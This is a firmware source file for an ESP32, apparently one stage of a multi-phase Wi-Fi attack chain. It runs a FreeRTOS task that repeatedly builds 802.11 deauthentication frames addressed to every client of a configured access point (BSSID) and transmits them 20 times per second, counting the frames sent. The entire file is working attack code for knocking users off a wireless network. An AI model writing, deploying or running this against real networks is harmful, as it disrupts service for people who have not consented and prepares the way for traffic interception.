#include "deauth_module.h"
#include "config.h"
#include "chain_controller.h"
#include "frame_builder.h"
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>
#include <esp_wifi.h>

static TaskHandle_t _deauth_task = nullptr;

static void deauth_task_fn(void* pvParam) {
    uint8_t buf[64];
    uint8_t broadcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
    while (is_phase_active(EstadoCadena::FASE_2_DEAUTH)) {
        size_t len = build_deauth_frame(buf, sizeof(buf),
                                        broadcast,
                                        g_config.bssid_bytes, 7);
        if (len > 0) {
            esp_wifi_80211_tx(WIFI_IF_AP, buf, len, false);
            g_chain_state.deauths_emitidos++;
        }
        vTaskDelay(pdMS_TO_TICKS(50));  // 20 deauths/sec
    }
    _deauth_task = nullptr;
    vTaskDelete(nullptr);
}

void deauth_task_start() {
    if (_deauth_task) return;
    xTaskCreatePinnedToCore(deauth_task_fn, "deauth_emitter", 4096, nullptr,
                            tskIDLE_PRIORITY + 4, &_deauth_task, 1);
}

void deauth_task_stop() {
    _deauth_task = nullptr;
}
